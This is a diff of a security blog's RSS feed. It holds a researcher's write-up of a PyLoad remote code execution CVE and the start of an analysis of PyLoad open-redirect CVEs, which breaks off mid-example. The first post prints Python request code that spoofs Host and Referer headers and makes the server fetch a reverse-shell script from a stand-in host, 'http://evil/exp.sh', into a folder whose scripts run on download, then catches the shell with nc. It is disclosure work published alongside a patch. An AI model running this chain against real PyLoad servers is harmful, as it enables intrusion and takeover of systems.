@@ -1,22 +1,426 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
         <title>Posts on Bayesian Blogs</title>
-        <link>https://baishya.xyz/posts/</link>
+        <link>http://localhost:1313/posts/</link>
         <description>Recent content in Posts on Bayesian Blogs</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Sun, 14 Jan 2024 21:51:34 -0800</lastBuildDate>
-        <atom:link href="https://baishya.xyz/posts/index.xml" rel="self" type="application/rss+xml" />
+        <lastBuildDate>Fri, 25 Oct 2024 17:00:09 -0800</lastBuildDate>
+        <atom:link href="http://localhost:1313/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>CVE-2024-47821: Remote Code Execution in PyLoad</title>
+            <link>http://localhost:1313/posts/cve-2024-47821/</link>
+            <pubDate>Fri, 25 Oct 2024 17:00:09 -0800</pubDate>
+            
+            <guid>http://localhost:1313/posts/cve-2024-47821/</guid>
+            <description>&lt;p&gt;I found my first CVE! &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2024-47821&#34;&gt;CVE-2024-47821&lt;/a&gt; (&lt;a href=&#34;https://github.com/pyload/pyload/security/advisories/GHSA-w7hq-f2pj-c53g&#34;&gt;GitHub Advisory&lt;/a&gt;) is a remote code execution vulnerability in &lt;a href=&#34;https://pyload.net/&#34;&gt;PyLoad&lt;/a&gt;. PyLoad is an open source download manager written in Python. The folder &lt;code&gt;~/.pyload/scripts&lt;/code&gt; on the server where PyLoad is installed has scripts which are run when certain actions are completed, for e.g. a download is finished. By downloading a executable file to a folder in &lt;code&gt;~/.pyload/scripts&lt;/code&gt; and performing the respective action, remote code execution can be achieved. A file can be downloaded to such a folder by changing the download folder to a folder in &lt;code&gt;~/.pyload/scripts&lt;/code&gt; path and using the &lt;code&gt;/flashgot&lt;/code&gt; API to download the file.&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<p>I found my first CVE! <a href="https://www.cve.org/CVERecord?id=CVE-2024-47821">CVE-2024-47821</a> (<a href="https://github.com/pyload/pyload/security/advisories/GHSA-w7hq-f2pj-c53g">GitHub Advisory</a>) is a remote code execution vulnerability in <a href="https://pyload.net/">PyLoad</a>. PyLoad is an open source download manager written in Python. The folder <code>~/.pyload/scripts</code> on the server where PyLoad is installed has scripts which are run when certain actions are completed, for e.g. a download is finished. By downloading a executable file to a folder in <code>~/.pyload/scripts</code> and performing the respective action, remote code execution can be achieved. A file can be downloaded to such a folder by changing the download folder to a folder in <code>~/.pyload/scripts</code> path and using the <code>/flashgot</code> API to download the file.</p>
+<p>CVSS v4.0 Base Score: 9.4 (<a href="https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H">AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H</a>)</p>
+<p>I rated PR:H as admin access is required to change the dowload folder to <code>~/.pyload/scripts</code>. Once that is done, no privileges are required to send the requests to trigger RCE.</p>
+<h2 id="a-history-lesson">A history lesson</h2>
+<p>I first encountered PyLoad in the Hack the Box PC machine (I <a href="https://www.baishya.xyz/posts/htb-pc/">wrote</a> about writing a script to solve the machine in an automatable fashion). I then analyzed some CVEs in PyLoad in a previous <a href="https://baishya.xyz/posts/pyload-cves/">post</a>. While analyzing the CVEs, I built a decent understanding of how the APIs and Web UI of PyLoad work.</p>
+<p>Since I had already spent some time looking at PyLoad code, I decided to choose PyLoad as my target to find a CVE - and then proceeded to not do anything with respect to security research for the next few months (partially due to some life events - but mostly because I was lazy). Eventually, I somehow dragged myself back to the realm of security research - and I decided to take another look at PyLoad.</p>
+<p>PyLoad uses a library <code>js2py</code> to execute JavaScript in Python. This was the source of a previous remote code execution CVE (CVE-2023–0297). The TL;DR is that PyLoad did not disable <code>js2py</code>&rsquo;s <code>pyimport</code> feature and therefore allowed importing of Python libraries like <code>os</code> into <code>js2py.eval_js()</code>. This allowed an attacker to send a crafted request with a command injection payload in the <code>jk</code> parameter to the <code>/flash/addcrypted2</code> API and achieve remote code execution. To fix this issue, <code>pyimport</code> was disabled for PyLoad.</p>
+<h2 id="cve-2024-28397">CVE-2024-28397</h2>
+<p>I had previously learnt about recursive attribute lookups in Python - and I wondered if this could be used to find a module through recursive lookup in <code>js2py</code>, which allowed executing code. Turns out the answer is Yes. However:</p>
+<ol>
+<li>This was already discovered (<a href="https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape">CVE-2024-28397</a>)</li>
+<li>The payload was way beyond something I could have come up with.</li>
+</ol>
+<p>This was good news to me - since I could try the payload provided in the repo against PyLoad and see if it worked. I quickly got a script ready to call the <code>/flash/addcrypted2</code> with the payload provided in <code>jk</code> parameter to test if PyLoad is vulnerable to this CVE. On sending the request, I encountered a strange error: <code>403: Forbidden</code>. Huh? I did not see any authentication checks in the API code, so I was confused why I got this error.</p>
+<h2 id="bypassing-local_check">Bypassing <code>local_check</code></h2>
+<p>To understand the source of this error, I took another look at the API code. The function for this API has a <code>local_check</code> decorator:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#a6e22e">@bp.route</span>(<span style="color:#e6db74">&#34;/flash/addcrypted2&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>], endpoint<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;addcrypted2&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@local_check</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">addcrypted2</span>():
+</span></span><span style="display:flex;"><span>    package <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;package&#34;</span>, flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;source&#34;</span>, flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;referer&#34;</span>))
+</span></span><span style="display:flex;"><span>    )
+</span></span></code></pre></div><p>The decorator is defined like this</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">local_check</span>(func):
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@wraps</span>(func)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">wrapper</span>(<span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs):
+</span></span><span style="display:flex;"><span>        remote_addr <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;REMOTE_ADDR&#34;</span>, <span style="color:#e6db74">&#34;0&#34;</span>)
+</span></span><span style="display:flex;"><span>        http_host <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;HTTP_HOST&#34;</span>, <span style="color:#e6db74">&#34;0&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> remote_addr <span style="color:#f92672">in</span> (<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>, <span style="color:#e6db74">&#34;::ffff:127.0.0.1&#34;</span>, <span style="color:#e6db74">&#34;::1&#34;</span>, <span style="color:#e6db74">&#34;localhost&#34;</span>) <span style="color:#f92672">or</span> http_host <span style="color:#f92672">in</span> (
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;127.0.0.1:9666&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;[::1]:9666&#34;</span>,
+</span></span><span style="display:flex;"><span>        ):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> func(<span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Forbidden&#34;</span>, <span style="color:#ae81ff">403</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> wrapper
+</span></span></code></pre></div><p>The <code>local_check</code> function relies on the HTTP Host header to determine if the request came from a local address. The HTTP Host header can be manipulated by the sender of the request - and therefore can be spoofed to bypass this check (I will dive into more details in a later section). Combining the <code>local_check</code> bypass and the payload for CVE-2024-28397, I was able to achieve remote code execution in PyLoad.</p>
+<p>I reported this issue to the PyLoad developers, but it turned out that the researcher who discovered CVE-2024-28397 had already reported it to PyLoad - which in hindsight was pretty obvious, since their repo mentions PyLoad is vulnerable to this CVE. At the time of me (re)discovering that PyLoad is vulnerable to CVE-2024-28397, there was no advisory for this issue for PyLoad - so I had decided to report it anyway. A few days later, an advisory was released - crediting the original reporter of CVE-2024-28397.</p>
+<p>Since my submission was deemed a duplicate, I set out to find a new CVE in PyLoad - something that did not rely on existing CVEs in libraries used by PyLoad. I went back to the APIs listed in <a href="https://github.com/pyload/pyload/blob/develop/src/pyload/webui/app/blueprints/cnl_blueprint.py"><code>cnl_blueprint.py</code></a> (the same file where the <code>/flash/addcrypted2</code> API and the <code>local_check</code> function are defined). Since I knew I could bypass the <code>local_check</code>, I wanted to find another API that performs some &ldquo;dangerous&rdquo; operation.</p>
+<h2 id="blind-server-side-request-forgery">Blind Server Side Request Forgery</h2>
+<p>The <code>cnl_blueprint.py</code> file has another API <code>/flashgot</code> which in addition to the <code>local_check</code> has a Referer header check. This header check can also be bypassed by just setting it to something PyLoad will accept.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#a6e22e">@bp.route</span>(<span style="color:#e6db74">&#34;/flashgot&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>], endpoint<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;flashgot&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@bp.route</span>(<span style="color:#e6db74">&#34;/flashgot_pyload&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>], endpoint<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;flashgot&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@local_check</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">flashgot</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>referrer <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> (
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;http://localhost:9666/flashgot&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;http://127.0.0.1:9666/flashgot&#34;</span>,
+</span></span><span style="display:flex;"><span>    ):
+</span></span><span style="display:flex;"><span>        flask<span style="color:#f92672">.</span>abort(<span style="color:#ae81ff">500</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">...</span>    
+</span></span></code></pre></div><p>Combining the headers to bypass both checks, I arrived at headers like this</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;host&#34;</span>: <span style="color:#e6db74">&#34;127.0.0.1:9666&#34;</span>, <span style="color:#e6db74">&#34;Referer&#34;</span>: <span style="color:#e6db74">&#34;http://127.0.0.1:9666/flashgot&#34;</span>}
+</span></span></code></pre></div><p>The <code>flashgot</code> API has a functionality to provide an URL from which PyLoad will download a file. There is additional parameter <code>autostart</code> which when provided results in PyLoad automatically downloading the file without any user interaction. Sending a request like below will download the file at the URL, to a folder named as per the <code>package</code> parameter, in the download location set in PyLoad (by default its <code>~/Downloads</code>)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://pyload/flashgot&#34;</span>
+</span></span><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;host&#34;</span>: <span style="color:#e6db74">&#34;127.0.0.1:9666&#34;</span>, <span style="color:#e6db74">&#34;Referer&#34;</span>: <span style="color:#e6db74">&#34;http://127.0.0.1:9666/flashgot&#34;</span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;package&#34;</span>: <span style="color:#e6db74">&#34;example_packge&#34;</span>,  
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;passwords&#34;</span>: <span style="color:#e6db74">&#34;optional_password&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;urls&#34;</span>: <span style="color:#e6db74">&#34;http://evil/exp.sh&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;autostart&#34;</span>: <span style="color:#ae81ff">1</span>,
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, data<span style="color:#f92672">=</span>data, headers<span style="color:#f92672">=</span>headers)
+</span></span></code></pre></div><p>I created a file <code>exp.sh</code> which contained a basic bash reverse shell and exposed it using a Python simple HTTP server. Once I sent the request, PyLoad downloaded the <code>exp.sh</code> to <code>~/Downloads/example_package/exp.sh</code>. This is a blind SSRF vulnerability, but it is not particularly interesting. An attacker can probably use this to download malware into a system running PyLoad - but its not as interesting as code execution.</p>
+<h2 id="escalating-the-ssrf-to-remote-code-execution">Escalating the SSRF to Remote Code Execution</h2>
+<p>The next step in my journey to find remote code execution was to somehow execute the reverse shell script. There are a few other CVEs in PyLoad where a file was downloaded to certain folders to have them execute or render - leading to remote code execution. However, as a fix for these issues, certain paths could not be set as the download folder.</p>
+<p>Purely by chance, while I was staring at PyLoad logs, I found a log line that said &ldquo;No script found under folder download_finished&rdquo;. This implied that a user can specify scripts that are run when downloads are finished. Looking for this folder on my system, I came across a folder <code>~/.pyload/scripts</code> which has many subfolders for different triggers such as <code>download_finished</code>, <code>package_processed</code> and so on.</p>
+<p>I added a script to the <code>download_finished</code> folder and then sent a download request to <code>/flashgot</code>. Once the file was downloaded, the script I added to <code>download_finished</code> executed! From there, the path to remote code execution was pretty straighforward. I had to change a few PyLoad settings:</p>
+<ol>
+<li>Change the download folder to <code>~/.pyload/scripts</code></li>
+<li>Change permissions of downloads: on</li>
+<li>Permission mode for downloaded files: 0744</li>
+</ol>
+<p><img src="/cve-2024-47821-1.png" alt="download-location"></p>
+<p>I also changed my request to <code>/flashgot</code> to set the <code>package</code> to <code>download_finised</code> so that the script is downloaded to the <code>download_finished</code> folder.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>data <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;package&#34;</span>: <span style="color:#e6db74">&#34;download_finished&#34;</span>, 
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;passwords&#34;</span>: <span style="color:#e6db74">&#34;optional_password&#34;</span>, 
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;urls&#34;</span>: <span style="color:#e6db74">&#34;http://evil/exp.sh&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;autostart&#34;</span>: <span style="color:#ae81ff">1</span>,
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Sending this request once downloads <code>exp.sh</code> (which is a bash reverse shell) to the <code>download_finished</code> folder.</p>
+<p><img src="/cve-2024-47821-2.png" alt="download-finished"></p>
+<p>Sending it a second time downloads <code>exp.sh</code> again into the folder, but crucially also executes the existing <code>exp.sh</code> script.</p>
+<p><img src="/cve-2024-47821-3.png" alt="script-exec"></p>
+<p>I set up a simple <code>nc</code> listener where I received a reverse shell once <code>exp.sh</code> was executed. Remote code execution acheived, system compromised.</p>
+<p><img src="/cve-2024-47821-4.png" alt="rce"></p>
+<h2 id="a-small-word-regarding-my-setup">A small word regarding my setup</h2>
+<p>A while back I had purchased a Raspberry Pi - and as with quite a few things I buy - I played with it for a week or two and then it just sat at my desk (in that one week I installed pihole on it - so it is not completely useless). So on a whim, I decided to install PyLoad on the Pi instead of my laptop. This turned out to be an important decision - as this led me to discovering the <code>local_check</code> function. If I was testing PyLoad on my laptop itself, the <code>local_check</code> would not have triggered. I might have found the other issues anyway, but bypassing the <code>local_check</code> check makes the finding &ldquo;complete&rdquo;.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>That was a fun ride! My first CVE will always be special, but it being a remote code execution issue makes it even better. Having to chain multiple bugs was a great exercise for my research skills. Finding this CVE gives me the confidence and motivation to continue hunting. My aim for this year was to find one CVE. Having found that, and with a couple months remaining in the year - maybe I will find more?</p>
+<h2 id="timeline">Timeline</h2>
+<ul>
+<li>September 8, 2024: Issue reported to PyLoad via GitHub.</li>
+<li>October 4, 2024: Report accepted by PyLoad maintainers.</li>
+<li>October 7, 2024: CVE 2024-47821 assigned.</li>
+<li>October 25, 2024: Patched version of PyLoad released, blog published.</li>
+</ul>
+<p>Thank you for reading! Take care!</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Analyzing new-ish CVEs in PyLoad</title>
+            <link>http://localhost:1313/posts/pyload-cves/</link>
+            <pubDate>Sat, 20 Apr 2024 07:56:09 -0700</pubDate>
+            
+            <guid>http://localhost:1313/posts/pyload-cves/</guid>
+            <description>&lt;p&gt;&lt;a href=&#34;https://pyload.net/&#34;&gt;PyLoad&lt;/a&gt; is an open source download manager written in Python. I first came across PyLoad while solving a HackTheBox machine (PC). Solving the machine required exploiting a pre-auth RCE (&lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2023-0297&#34;&gt;CVE-2023-0297&lt;/a&gt;). I then rediscovered PyLoad when I was looking for CVEs to analyze. My intention was to analyze around 3-4 CVEs in the same product and PyLoad fit the bill perfectly, as there were 4 CVEs disclosed in January and February 2024. In this article, I will explain the CVEs, examine the provided proof of concepts, and evaluate the fixes.&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<p><a href="https://pyload.net/">PyLoad</a> is an open source download manager written in Python. I first came across PyLoad while solving a HackTheBox machine (PC). Solving the machine required exploiting a pre-auth RCE (<a href="https://nvd.nist.gov/vuln/detail/CVE-2023-0297">CVE-2023-0297</a>). I then rediscovered PyLoad when I was looking for CVEs to analyze. My intention was to analyze around 3-4 CVEs in the same product and PyLoad fit the bill perfectly, as there were 4 CVEs disclosed in January and February 2024. In this article, I will explain the CVEs, examine the provided proof of concepts, and evaluate the fixes.</p>
+<h2 id="cve-2024-24808-open-redirect">CVE-2024-24808 (Open Redirect)</h2>
+<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-24808">CVE-2024-24808</a> is a open redirect vulnerability in PyLoad due to incorrect sanitization of the redirect URL which allows an attacker to bypass the URL sanitization function and redirect users to arbitrary URLs. The details provided here are taken from the <a href="https://github.com/pyload/pyload/security/advisories/GHSA-g3cm-qg2v-2hj5">detailed advisory</a> available in the PyLoad repository.</p>
+<h3 id="vulnerability">Vulnerability</h3>
+<p>PyLoad allows redirecting users to a new page after login by using a <code>next</code> query parameter (eg: <code>https://pyload.test/login?next=home</code>). PyLoad parses the provided <code>next</code> parameter and performs some checks in the <code>get_redirect_url</code> function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login</span>():
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>  next <span style="color:#f92672">=</span> get_redirect_url(fallback<span style="color:#f92672">=</span>flask<span style="color:#f92672">.</span>url_for(<span style="color:#e6db74">&#34;app.dashboard&#34;</span>))
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_redirect_url</span>(fallback<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
+</span></span><span style="display:flex;"><span>    login_url <span style="color:#f92672">=</span> urljoin(flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>url_root, flask<span style="color:#f92672">.</span>url_for(<span style="color:#e6db74">&#39;app.login&#39;</span>))
+</span></span><span style="display:flex;"><span>    request_url <span style="color:#f92672">=</span> unquote(flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>url)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> location <span style="color:#f92672">in</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>values<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;next&#34;</span>), flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>referrer:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> location:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> location <span style="color:#f92672">in</span> (request_url, login_url):  <span style="color:#75715e"># don&#39;t redirect to same location</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> is_safe_url(location):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> location
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> fallback
+</span></span></code></pre></div><p>One of the performed checks is <code>is_safe_url</code>, which is supposed to check if the URL provided is in the same host. The check should return <code>False</code> when arbitrary URLs, outside the domain in which PyLoad is running, are tested.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#75715e">#: Checks if location belongs to same host address</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">is_safe_url</span>(location):
+</span></span><span style="display:flex;"><span>    ref_url <span style="color:#f92672">=</span> urlparse(flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>host_url)
+</span></span><span style="display:flex;"><span>    test_url <span style="color:#f92672">=</span> urlparse(urljoin(flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>host_url, location))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> test_url<span style="color:#f92672">.</span>scheme <span style="color:#f92672">in</span> (<span style="color:#e6db74">&#39;http&#39;</span>, <span style="color:#e6db74">&#39;https&#39;</span>) <span style="color:#f92672">and</span> ref_url<span style="color:#f92672">.</span>netloc <span style="color:#f92672">==</span> test_url<span style="color:#f92672">.</span>netloc
+</span></span></code></pre></div><p>This works for the most part, except if malformed URLs are provided to <code>urlparse</code>. According to <a href="https://docs.python.org/3/library/urllib.parse.html#urllib.parse.urlparse"><code>urlparse</code></a> documentation, any malformed URLs are presumed to be a relative URL. This means it has no <code>netloc</code> and has a <code>path</code> component.</p>
+<pre tabindex="0"><code>urlparse(&#34;http://a.xyz&#34;)
+ParseResult(scheme=&#39;http&#39;, netloc=&#39;a.xyz&#39;, path=&#39;&#39;, params=&#39;&#39;, query=&#39;&#39;, fragment=&#39;&#39;)
+
+urlparse(&#34;http:///a.xyz&#34;)
+ParseResult(scheme=&#39;http&#39;, netloc=&#39;&#39;, path=&#39;/a.xyz&#39;, params=&#39;&#39;, query=&#39;&#39;, fragment=&#39;&#39;)
+</code></pre><p>Therefore, when a malformed URL is provided to <code>is_safe_url</code> it returns <code>True</code>, i.e. the URL is safe. This can be seen in the example below. The provided <code>location</code> is first joined to the request host URL (<code>localhost:8080</code>) and then parsed with <code>urlparse</code> in <code>is_safe_url</code>. When malformed URL, <code>http:///a.xyz</code>, is provided, after <code>urljoin</code>, <code>a.xyz</code> is joined to <code>localhost:8080</code> as the malformed URL is treated as a path. This causes the test to return <code>True</code>.</p>
+<pre tabindex="0"><code>Location: /home
+Joined URL: http://localhost:8080/home
+Ref URL: ParseResult(scheme=&#39;http&#39;, netloc=&#39;localhost:8080&#39;, path=&#39;/&#39;, params=&#39;&#39;, query=&#39;&#39;, fragment=&#39;&#39;)
+Test URL: ParseResult(scheme=&#39;http&#39;, netloc=&#39;localhost:8080&#39;, path=&#39;/home&#39;, params=&#39;&#39;, query=&#39;&#39;, fragment=&#39;&#39;)
+True
+
+Location: http://a.xyz
+Joined URL: http://a.xyz
+Ref URL: ParseResult(scheme=&#39;http&#39;, netloc=&#39;localhost:8080&#39;, path=&#39;/&#39;, params=&#39;&#39;, query=&#39;&#39;, fragment=&#39;&#39;)
+Test URL: ParseResult(scheme=&#39;http&#39;, netloc=&#39;a.xyz&#39;, path=&#39;&#39;, params=&#39;&#39;, query=&#39;&#39;, fragment=&#39;&#39;)
+False
+
+Location: http:///a.xyz
+Joined URL: http://localhost:8080/a.xyz
+Ref URL: ParseResult(scheme=&#39;http&#39;, netloc=&#39;localhost:8080&#39;, path=&#39;/&#39;, params=&#39;&#39;, query=&#39;&#39;, fragment=&#39;&#39;)
+Test URL: ParseResult(scheme=&#39;http&#39;, netloc=&#39;localhost:8080&#39;, path=&#39;/a.xyz&#39;, params=&#39;&#39;, query=&#39;&#39;, fragment=&#39;&#39;)
+True
+</code></pre><p>When <code>is_safe_url</code> returns <code>True</code>, the redirect URL is set to the malformed URL <code>http:///a.xyz</code> which is then normalized to <code>http://a.xyz</code> leading to open redirect.</p>
+<h3 id="fix">Fix</h3>
+<p>The vulnerability is fixed by <a href="https://github.com/pyload/pyload/commit/fe94451dcc2be90b3889e2fd9d07b483c8a6dccd">this PR</a>.</p>
+<p>In the PR, the <code>is_safe_url</code> function is updated, but I did not find any usages of the function, so I will not discuss it here. The fix appears to be modifying the <code>get_redirect_url</code> function to use <code>flask.url_for</code>. According to the <a href="https://flask.palletsprojects.com/en/3.0.x/api/#flask.Flask.url_for">documentation</a> <code>url_for</code> can be used to generate URLs for an endpoint. If an endpoint is not found for the provided value, it throws a <code>werkzeug.routing.BuildError</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_redirect_url</span>(fallback<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
+</span></span><span style="display:flex;"><span>    next_arg <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>values<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;next&#34;</span>)
+</span></span><span style="display:flex;"><span>    redirect_url <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>url_for(fallback)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> next_arg <span style="color:#f92672">and</span> next_arg <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;login&#34;</span>:  <span style="color:#75715e"># don&#39;t redirect to same location</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            redirect_url <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>url_for(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;app.</span><span style="color:#e6db74">{</span>next_arg<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> werkzeug<span style="color:#f92672">.</span>routing<span style="color:#f92672">.</span>BuildError:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> urljoin(flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>url_root, redirect_url)
+</span></span></code></pre></div><p>Now for any provided value of <code>next</code>, <code>flask</code> will attempt to build a URL for <code>app.{next_arg}</code> and if its not found, it will redirect to the fallback.</p>
+<pre tabindex="0"><code>/home &lt;-- this endpoint exists
+127.0.0.1 - - [16/Mar/2024 11:19:35] &#34;GET /?next=home HTTP/1.1&#34; 200 -
